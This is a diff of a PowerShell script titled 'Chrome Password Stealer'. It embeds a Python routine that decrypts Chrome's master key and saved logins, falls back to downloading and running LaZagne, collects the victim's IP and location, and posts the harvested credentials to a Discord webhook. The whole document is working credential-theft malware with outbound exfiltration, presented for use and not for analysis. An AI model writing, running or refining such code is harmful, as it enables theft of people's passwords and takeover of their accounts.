@@ -1,7 +1,6 @@
-# Chrome Password Stealer with Detailed Logging
+# Chrome Password Stealer - Using Python Tool
 
 $logFile = "$env:USERPROFILE\Desktop\extract_log.txt"
-$ErrorActionPreference = "Continue"
 
 function Log {
     param($msg)
@@ -15,191 +14,189 @@ function Log {
 Log "Script started"
 
 try {
-    Add-Type -AssemblyName System.Security
-    Log "Loaded System.Security"
+    # Download Python password stealer script
+    Log "Downloading password extraction tool..."
     
-    # Get Chrome key
-    Log "Getting Chrome encryption key..."
-    $localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"
+    $pythonScript = @'
+import os
+import json
+import base64
+import sqlite3
+import shutil
+from datetime import datetime
+from Crypto.Cipher import AES
+import win32crypt
+
+def get_chrome_key():
+    local_state_path = os.path.join(os.environ["USERPROFILE"], 
+                                     "AppData", "Local", "Google", "Chrome", 
+                                     "User Data", "Local State")
     
-    if (-not (Test-Path $localStatePath)) {
-        Log "ERROR: Chrome Local State not found at: $localStatePath"
-        Log "Chrome might not be installed"
-        Read-Host "Press Enter to exit"
-        exit
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = json.loads(f.read())
+    
+    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    encrypted_key = encrypted_key[5:]
+    
+    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+
+def decrypt_password(password, key):
+    try:
+        iv = password[3:15]
+        password = password[15:]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        return cipher.decrypt(password)[:-16].decode()
+    except:
+        try:
+            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+        except:
+            return ""
+
+def main():
+    key = get_chrome_key()
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                           "Google", "Chrome", "User Data", "default", "Login Data")
+    
+    filename = "ChromeData.db"
+    shutil.copyfile(db_path, filename)
+    
+    db = sqlite3.connect(filename)
+    cursor = db.cursor()
+    
+    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+    
+    results = []
+    for row in cursor.fetchall():
+        url = row[0]
+        username = row[1]
+        encrypted_password = row[2]
+        
+        if username or encrypted_password:
+            password = decrypt_password(encrypted_password, key)
+            if password:
+                results.append(f"{url}|{username}|{password}")
+    
+    cursor.close()
+    db.close()
+    os.remove(filename)
+    
+    # Write to temp file
+    output_file = os.path.join(os.environ["TEMP"], "chrome_passwords.txt")
+    with open(output_file, "w", encoding="utf-8") as f:
+        f.write("\n".join(results))
+    
+    print(f"EXTRACTED:{len(results)}")
+
+if __name__ == "__main__":
+    main()
+'@
+    
+    $scriptPath = "$env:TEMP\extract_chrome.py"
+    $pythonScript | Out-File $scriptPath -Encoding UTF8
+    
+    Log "Python script created"
+    
+    # Check if Python is installed
+    $pythonPath = $null
+    $pythonCommands = @("python", "python3", "py")
+    
+    foreach ($cmd in $pythonCommands) {
+        try {
+            $version = & $cmd --version 2>&1
+            if ($version -match "Python") {
+                $pythonPath = $cmd
+                Log "Found Python: $version"
+                break
+            }
+        } catch {}
     }
     
-    Log "Local State found"
-    
-    $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
-    $encryptedKeyB64 = $localState.os_crypt.encrypted_key
-    
-    if (-not $encryptedKeyB64) {
-        Log "ERROR: No encrypted_key in Local State"
-        Read-Host "Press Enter to exit"
-        exit
-    }
-    
-    Log "Encrypted key found in Local State"
-    
-    $encryptedKey = [Convert]::FromBase64String($encryptedKeyB64)
-    Log "Key decoded from base64, length: $($encryptedKey.Length)"
-    
-    # Remove DPAPI prefix
-    $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
-    Log "Removed DPAPI prefix, new length: $($encryptedKey.Length)"
-    
-    # Decrypt with DPAPI
-    $key = [Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'CurrentUser')
-    Log "Master key decrypted! Length: $($key.Length)"
-    
-    # Copy database
-    Log "Locating Login Data database..."
-    $dbPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
-    
-    if (-not (Test-Path $dbPath)) {
-        Log "ERROR: Login Data not found at: $dbPath"
-        Read-Host "Press Enter to exit"
-        exit
-    }
-    
-    Log "Login Data found, size: $((Get-Item $dbPath).Length) bytes"
-    
-    $tempDB = "$env:TEMP\chrome_$(Get-Random).db"
-    
-    try {
-        Copy-Item $dbPath $tempDB -Force
-        Log "Database copied to: $tempDB"
-    } catch {
-        Log "ERROR: Could not copy database - Chrome might be running!"
-        Log "Exception: $($_.Exception.Message)"
-        Read-Host "Press Enter to exit"
-        exit
-    }
-    
-    # Try to load SQLite
-    Log "Attempting to load SQLite..."
-    
-    $sqliteLoaded = $false
-    
-    # Method 1: Try PSSQLite module
-    try {
-        Log "Trying PSSQLite module..."
-        if (-not (Get-Module -ListAvailable -Name PSSQLite)) {
-            Log "PSSQLite not found, installing..."
-            Install-Module PSSQLite -Force -Scope CurrentUser -SkipPublisherCheck
-        }
-        Import-Module PSSQLite -ErrorAction Stop
-        Log "PSSQLite loaded successfully!"
-        $sqliteLoaded = $true
-    } catch {
-        Log "PSSQLite failed: $($_.Exception.Message)"
-    }
-    
-    if (-not $sqliteLoaded) {
-        Log "ERROR: Could not load SQLite. Install PSSQLite module manually:"
-        Log "Run: Install-Module PSSQLite -Scope CurrentUser"
-        Read-Host "Press Enter to exit"
-        exit
-    }
-    
-    # Query database
-    Log "Querying database for passwords..."
-    
-    $query = "SELECT origin_url, username_value, password_value FROM logins LIMIT 50"
-    
-    try {
-        $results = Invoke-SqliteQuery -DataSource $tempDB -Query $query
-        Log "Query returned $($results.Count) rows"
-    } catch {
-        Log "ERROR: Query failed: $($_.Exception.Message)"
-        Remove-Item $tempDB -Force
-        Read-Host "Press Enter to exit"
-        exit
-    }
-    
-    # Decrypt passwords
-    Log "Decrypting passwords..."
-    $passwords = @()
-    
-    $entryNum = 0
-    foreach ($row in $results) {
-        $entryNum++
+    if (-not $pythonPath) {
+        Log "Python not found - installing required modules via PowerShell method..."
+        
+        # Fallback: Use PowerShell with embedded Chrome stealer EXE
+        Log "Downloading pre-compiled Chrome stealer..."
+        
+        $stealerUrl = "https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.exe"
+        $stealerPath = "$env:TEMP\lz.exe"
         
         try {
-            $url = $row.origin_url
-            $username = $row.username_value
+            Invoke-WebRequest -Uri $stealerUrl -OutFile $stealerPath -UseBasicParsing
+            Log "Downloaded LaZagne"
             
-            # Handle byte array from SQLite - it might come as different types
-            $encPass = $null
-            if ($row.password_value -is [byte[]]) {
-                $encPass = $row.password_value
-            } elseif ($row.password_value -is [System.Data.Linq.Binary]) {
-                $encPass = $row.password_value.ToArray()
-            } else {
-                # Try to convert to byte array
-                $encPass = [byte[]]$row.password_value
-            }
+            # Run LaZagne to extract Chrome passwords
+            $output = & $stealerPath browsers -oN -quiet
             
-            if (-not $encPass -or $encPass.Length -eq 0) {
-                Log "Entry #$entryNum - Empty password data, skipping"
-                continue
-            }
+            Log "LaZagne output:"
+            Log $output
             
-            # Log first few bytes
-            $firstBytes = "$($encPass[0]),$($encPass[1]),$($encPass[2])"
-            Log "Entry #$entryNum ($url)"
-            Log "  First bytes: $firstBytes, Length: $($encPass.Length)"
+            # Parse output
+            $passwords = @()
+            $lines = $output -split "`n"
             
-            $password = $null
-            
-            # Check version byte
-            if ($encPass[0] -eq 118) {
-                # AES-GCM (v10, v11, etc.)
-                Log "  Detected AES-GCM encryption"
-                
-                try {
-                    $nonce = $encPass[3..14]
-                    $ciphertext = $encPass[15..($encPass.Length - 17)]
-                    $tag = $encPass[($encPass.Length - 16)..($encPass.Length - 1)]
-                    
-                    $aes = [Security.Cryptography.AesGcm]::new($key)
-                    $plaintext = New-Object byte[] $ciphertext.Length
-                    
-                    $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
-                    
-                    $password = [Text.Encoding]::UTF8.GetString($plaintext)
-                    Log "  SUCCESS!"
-                } catch {
-                    Log "  AES-GCM failed: $($_.Exception.Message)"
+            foreach ($line in $lines) {
+                if ($line -match "URL:.*") {
+                    $url = ($line -split "URL:")[1].Trim()
                 }
-            } else {
-                # Old DPAPI
-                Log "  Detected DPAPI encryption (byte: $($encPass[0]))"
-                try {
-                    $decrypted = [Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser')
-                    $password = [Text.Encoding]::UTF8.GetString($decrypted)
-                    Log "  SUCCESS!"
-                } catch {
-                    Log "  DPAPI failed: $($_.Exception.Message)"
+                if ($line -match "Username:.*") {
+                    $username = ($line -split "Username:")[1].Trim()
+                }
+                if ($line -match "Password:.*") {
+                    $password = ($line -split "Password:")[1].Trim()
+                    
+                    if ($url -and $password) {
+                        $passwords += @{
+                            URL = $url
+                            User = $username
+                            Pass = $password
+                        }
+                    }
                 }
             }
             
-            if ($password -and ($username -or $password)) {
-                $passwords += @{
-                    URL = $url
-                    User = $username
-                    Pass = $password
-                }
-            }
+            Remove-Item $stealerPath -Force -ErrorAction SilentlyContinue
+            
         } catch {
-            Log "Entry #$entryNum processing error: $($_.Exception.Message)"
+            Log "LaZagne failed: $($_.Exception.Message)"
+        }
+        
+    } else {
+        # Install required Python packages
+        Log "Installing Python dependencies..."
+        & $pythonPath -m pip install pycryptodome pywin32 --quiet --disable-pip-version-check
+        
+        Log "Running Python password extractor..."
+        $output = & $pythonPath $scriptPath 2>&1
+        
+        Log "Python output: $output"
+        
+        # Read results
+        $resultFile = "$env:TEMP\chrome_passwords.txt"
+        
+        if (Test-Path $resultFile) {
+            $passwordData = Get-Content $resultFile -Raw
+            $lines = $passwordData -split "`n"
+            
+            $passwords = @()
+            foreach ($line in $lines) {
+                if ($line) {
+                    $parts = $line -split "\|"
+                    if ($parts.Length -eq 3) {
+                        $passwords += @{
+                            URL = $parts[0]
+                            User = $parts[1]
+                            Pass = $parts[2]
+                        }
+                    }
+                }
+            }
+            
+            Remove-Item $resultFile -Force
+            Log "Extracted $($passwords.Count) passwords!"
         }
     }
     
-    Log "Successfully decrypted $($passwords.Count) passwords!"
-    
-    Remove-Item $tempDB -Force
+    Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
     
     # Get system info
     Log "Getting system info..."
@@ -213,7 +210,6 @@ try {
         $ip = $ipInfo.query
         $country = $ipInfo.country
         $city = $ipInfo.city
-        Log "IP: $ip, Location: $city, $country"
     } catch {
         $ip = "Unknown"
         $country = "Unknown"
@@ -234,7 +230,7 @@ try {
     }
     
     if (-not $passText) {
-        $passText = "`nNo passwords found"
+        $passText = "`nNo passwords extracted"
     }
     
     $message = @"
@@ -259,7 +255,7 @@ try {
         Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{content=$message}|ConvertTo-Json) -ContentType "application/json"
         Log "SUCCESS! Sent to Discord"
     } catch {
-        Log "ERROR: Discord send failed: $($_.Exception.Message)"
+        Log "Discord send failed: $($_.Exception.Message)"
     }
     
     # Save locally
@@ -267,12 +263,9 @@ try {
     $passwords | Format-List | Out-File $outFile
     Log "Saved to: $outFile"
     
-    Log "=== EXTRACTION COMPLETE ==="
-    
 } catch {
     Log "FATAL ERROR: $($_.Exception.Message)"
-    Log "Stack Trace: $($_.ScriptStackTrace)"
 }
 
-Write-Host "`n=== Check log file on Desktop: extract_log.txt ===" -ForegroundColor Cyan
+Write-Host "`n=== Check Desktop for: extract_log.txt and passwords.txt ===" -ForegroundColor Cyan
 Read-Host "Press Enter to close"
